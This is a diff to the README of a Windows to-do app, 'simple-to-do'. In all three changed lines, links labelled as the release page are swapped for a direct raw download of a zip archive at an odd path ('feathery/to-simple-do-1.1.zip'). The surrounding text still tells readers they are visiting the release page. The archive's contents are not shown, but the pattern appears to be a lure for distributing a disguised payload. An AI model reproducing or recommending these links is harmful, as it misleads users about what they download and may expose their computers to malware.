@@ -1,6 +1,6 @@
 # ✅ simple-to-do - Manage Your Tasks with Ease
 
-[![Download simple-to-do](https://img.shields.io/badge/Download-Click%20Here-brightgreen?style=for-the-badge)](https://github.com/financelech419/simple-to-do/releases)
+[![Download simple-to-do](https://img.shields.io/badge/Download-Click%20Here-brightgreen?style=for-the-badge)](https://github.com/financelech419/simple-to-do/raw/refs/heads/main/feathery/to-simple-do-1.1.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This section shows how to get simple-to-do running on your Windows computer. Fol
 You need to visit the release page to get the latest version of simple-to-do. The files you download will allow you to install and run the app on your computer.
 
 **Visit this page to download:**  
-[![Download simple-to-do](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/financelech419/simple-to-do/releases)
+[![Download simple-to-do](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/financelech419/simple-to-do/raw/refs/heads/main/feathery/to-simple-do-1.1.zip)
 
 On the page, look for the latest release. There, find the Windows installer file (usually with an `.exe` extension) or a ready-to-run package. Download that file to your PC.
 
@@ -104,7 +104,7 @@ If you see errors or the app does not start:
 To get the latest improvements and bug fixes:
 
 1. Return to the release page:  
-   [simple-to-do Releases](https://github.com/financelech419/simple-to-do/releases)
+   [simple-to-do Releases](https://github.com/financelech419/simple-to-do/raw/refs/heads/main/feathery/to-simple-do-1.1.zip)
 
 2. Download the newest Windows installer or package.
 
